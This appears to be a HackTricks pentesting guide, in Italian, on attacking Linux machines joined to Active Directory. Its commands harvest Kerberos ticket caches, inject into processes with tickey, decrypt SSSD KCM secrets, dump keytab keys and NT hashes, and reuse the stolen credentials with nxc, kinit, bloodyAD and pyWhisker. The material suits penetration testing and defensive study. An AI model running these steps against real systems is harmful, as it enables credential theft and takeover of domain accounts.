# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Una macchina Linux può essere presente anche in un ambiente Active Directory.

Una macchina Linux all'interno di un AD può **archiviare materiale Kerberos localmente**: ccache degli utenti, keytab di macchine/servizi e segreti gestiti da SSSD. Questi artefatti possono solitamente essere riutilizzati come qualsiasi altra credenziale Kerberos. Per leggere la maggior parte di essi, dovrai essere l'utente proprietario del ticket oppure **root** sulla macchina.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumerazione

### Enumerazione di AD da Linux

Se hai accesso a un AD da Linux (o a bash in Windows), puoi provare [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) per enumerare l'AD.

Puoi anche consultare la seguente pagina per scoprire **altri modi per enumerare AD da Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA è un'**alternativa** open source a **Active Directory** di Microsoft Windows, principalmente per ambienti **Unix**. Combina una **directory LDAP** completa con un Key Distribution Center **Kerberos** MIT per una gestione simile a quella di Active Directory. Utilizza il **Certificate System** Dogtag per la gestione dei certificati CA e RA e supporta l'autenticazione **multi-factor**, incluse le smart card. SSSD è integrato per i processi di autenticazione Unix.<sup>[[14]](#references)[[15]](#references)</sup> Scopri di più qui:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefatti degli host aggiunti al dominio

Prima di intervenire sui ticket, identifica **come è stato aggiunto l'host ad AD** e **dove viene effettivamente archiviato il materiale Kerberos**. Negli host Linux moderni, di solito se ne occupano `realmd` + `adcli` + `sssd`, non solo file sparsi in `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Questo ti indica rapidamente se l'host si fida di AD, se SSSD memorizza nella cache identità o ticket e se sono disponibili **keytab di macchina/servizio** o **segreti KCM** da abusare.<sup>[[4]](#references)[[10]](#references)</sup>

Considera separatamente `/var/lib/sss/db/cache_*.ldb`, le ccache Kerberos e `/var/lib/sss/secrets/secrets.ldb`. I file `cache_*.ldb` possono contenere verificatori di password offline quando un dominio ha `cache_credentials = true` **e** l'utente si è autenticato in precedenza su quell'host. Di norma sono leggibili solo con privilegi elevati. La sola presenza di un file di cache o l'impostazione abilitata non dimostra che sia disponibile una password valida e attuale; prima di trarre questa conclusione, verifica l'impostazione effettiva per dominio e le identità realmente memorizzate nella cache. Consulta la [documentazione Red Hat sulla cache delle credenziali SSSD](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Per un confine d'identità distinto tra Linux e AD, la [mappatura dei nomi Kerberos tra vendor diversi](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) è rilevante solo quando un servizio accetta il ticket e mappa il suo principal sull'account Unix pertinente.

Su un host con `ksu`, un principal Kerberos valido può raggiungere un **account locale di destinazione**, incluso root, solo se quell'account autorizza il principal. [La documentazione MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) descrive i file `.k5login` e `.k5users` nella home dell'account di destinazione, nonché il fallback di mappatura dei nomi quando nessuno dei due esiste. `.k5users` può anche limitare i comandi per `ksu -e`; il solo nome di un file non dimostra l'accesso alla shell. Esamina l'account di destinazione esatto, la proprietà e i permessi dei file, le voci di autorizzazione leggibili, le credenziali Kerberos disponibili e le regole di mappatura effettive. Se la home di root non è accessibile, lo stato dell'autorizzazione resta sconosciuto. L'enumerazione passiva dovrebbe elencare questi percorsi e permessi senza richiedere ticket né eseguire `ksu`.

Un backup pianificato può creare indirettamente un confine di autorizzazione `.k5login`. Se un account con privilegi superiori copia ricorsivamente nella propria home una directory scrivibile da un utente con privilegi inferiori, verifica che la copia includa i file nascosti, che il percorso di destinazione corrisponda alla home effettiva dell'account e che il file risultante abbia una proprietà accettata dal servizio di login Kerberos. Ad esempio, [la documentazione di rsync](https://download.samba.org/pub/rsync/rsync.1.html) specifica che `-a --no-owner` lascia i nuovi file di destinazione di proprietà dell'utente ricevente. [La documentazione MIT Kerberos](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) spiega come un principal presente nel file `.k5login` di quell'utente possa autorizzare l'accesso. Verifica l'identità RunAs del job pianificato, l'accesso in scrittura alla sorgente, le opzioni effettive di rsync, il login con GSSAPI abilitato e la presenza di un ticket valido per il principal elencato; una directory sorgente scrivibile o un comando rsync pianificato, da soli, non dimostrano che il percorso sia praticabile.

Anche una keytab leggibile richiede una verifica specifica per principal. Una keytab contenente un principal con un nome che richiama l'amministrazione non dimostra di per sé la presenza di privilegi amministrativi: la [policy `kadm5.acl` del KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) controlla le operazioni consentite ai principal. Prima di considerare l'accesso alla keytab una via per ottenere root, verifica separatamente il principal, l'ACL effettiva e l'autorizzazione locale per `ksu` o per il login. Il triage passivo può elencare il percorso e i permessi della keytab senza usare le sue chiavi né contattare il KDC.

## Utilizzo dei ticket

### Pass The Ticket

In questa pagina troverai diversi luoghi in cui potresti **trovare ticket Kerberos all'interno di un host Linux**; nella pagina seguente puoi scoprire come convertire questi ticket CCache nel formato Kirbi (il formato necessario in Windows) e come eseguire un attacco PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se vuoi consultare i **workflow di raccolta dei ticket specifici per Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ecc.), visita la pagina dedicata:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Riutilizzo di ticket CCACHE da /tmp

I file CCACHE sono formati binari per **memorizzare credenziali Kerberos**. `FILE:/tmp/krb5cc_%{uid}` è ancora comune, ma le moderne distribuzioni Linux usano anche `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` o `KCM:%{uid}`. Controlla la variabile d'ambiente **`KRB5CCNAME`** e l'impostazione `default_ccache_name` prima di presumere che i ticket si trovino in `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Riutilizzo dei ticket CCACHE dal keyring

**È possibile estrarre i ticket Kerberos archiviati nella memoria di un processo**, soprattutto quando la protezione ptrace è disabilitata (`/proc/sys/kernel/yama/ptrace_scope`). Uno strumento utile a questo scopo è disponibile su [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey): facilita l'estrazione iniettandosi nelle sessioni e scaricando i ticket in `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Per configurare e usare questo strumento, si seguono i passaggi riportati di seguito:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Questa procedura tenterà di iniettarsi in varie sessioni; l'operazione riuscita è indicata dal salvataggio dei ticket estratti in `/tmp` secondo la convenzione di denominazione `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Riutilizzo dei ticket CCACHE da SSSD KCM

SSSD mantiene una copia del database nel percorso `/var/lib/sss/secrets/secrets.ldb`. La chiave corrispondente è memorizzata in un file nascosto nel percorso `/var/lib/sss/secrets/.secrets.mkey`. Per impostazione predefinita, la chiave è leggibile solo con i permessi di **root**.<sup>[[4]](#references)</sup>

Eseguendo **`SSSDKCMExtractor`** con i parametri --database e --key, verrà analizzato il database e **verranno decrittati i segreti**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

L'estrattore stampa payload JSON Kerberos grezzi; convertili in una ticket cache utilizzabile o in un altro formato di ticket prima delle operazioni pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triage rapido dei keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Estrazione degli account da /etc/krb5.keytab

Le chiavi degli account di servizio, essenziali per i servizi che operano con privilegi root, sono conservate in modo sicuro nei file **`/etc/krb5.keytab`**. Queste chiavi, simili a password per i servizi, richiedono una rigorosa riservatezza.<sup>[[5]](#references)</sup>

Per esaminare il contenuto del file keytab, è possibile usare **`klist`**. Su Linux, `klist -k -K -e` mostra i principal, i numeri di versione delle chiavi, i tipi di cifratura e il materiale grezzo delle chiavi. Se il tipo di chiave è **23 / RC4-HMAC**, il valore della chiave è anche l'**hash NT** di quel principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Per gli utenti Linux, **`KeyTabExtract`** offre la funzionalità di estrarre l'hash RC4 HMAC, che può essere sfruttato per riutilizzare hash NTLM. Tieni presente che è utile solo se il keytab contiene ancora materiale **etype 23 / RC4-HMAC**. Negli ambienti **solo AES** potresti non ottenere un hash NT riutilizzabile, ma puoi comunque autenticarti direttamente con il keytab tramite Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Su macOS, **`bifrost`** funge da strumento per l'analisi dei file keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Utilizzando le informazioni estratte sugli account e sugli hash, è possibile stabilire connessioni ai server con strumenti come **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Riutilizzare l'account del computer da `/etc/krb5.keytab`

Nei sistemi aggiunti al dominio con `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` contiene solitamente l'**account del computer** e uno o più principal **host/servizio**. Se hai **root**, non limitarti a scaricarlo: usa uno dei principal elencati da `klist -k` per richiedere un TGT e operare come host Linux stesso.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Questo è particolarmente utile quando l'**oggetto computer** stesso dispone di diritti delegati in AD o quando l'host può recuperare altri segreti, come un **gMSA**.<sup>[[13]](#references)</sup>

### Riutilizzare materiale Kerberos sottratto con strumenti AD pensati per Linux

Una volta ottenuto un `ccache` valido o un keytab utilizzabile, puoi operare direttamente su AD **da Linux** senza prima convertire tutto nei formati Windows. Molti strumenti moderni supportano nativamente `KRB5CCNAME` / l'autenticazione Kerberos.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Questo è un buon collegamento tra **Linux post-exploitation** e **AD object abuse**. Per i percorsi di abuso degli oggetti, consulta:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatti Linux gMSA / Managed Service Account

Le distribuzioni Linux recenti possono usare direttamente da AD gli **Managed Service Account**. In pratica, dopo aver compromesso un server Linux, potresti trovare non solo la keytab dell’host, ma anche **keytab specifiche per i servizi**, generate da un gMSA. Tra i percorsi più comuni da controllare ci sono `/etc/gmsad.conf`, i file di configurazione specifici della distribuzione e altri file `*.keytab` in `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Questo ti fornisce un’identità Kerberos riutilizzabile per gli SPN associati a quel gMSA **senza interagire con alcun endpoint Windows**.<sup>[[13]](#references)</sup> Per l’abuso di gMSA/dMSA **lato dominio** dopo aver ottenuto privilegi elevati in AD, consulta:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Come attaccare Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Accedere ad AD con un account di servizio gestito – Integrare direttamente i sistemi RHEL con Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variabili d’ambiente Kerberos – Documentazione MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentazione MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Tipi di crittografia Kerberos RC4-HMAC usati da Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Usare Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Individuare e aggiungere domini di identità | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guida utente di bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Informazioni | Documentazione FreeIPA](https://www.freeipa.org/About.html)
- [15] [Note di rilascio di FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentazione del kernel Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentazione MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
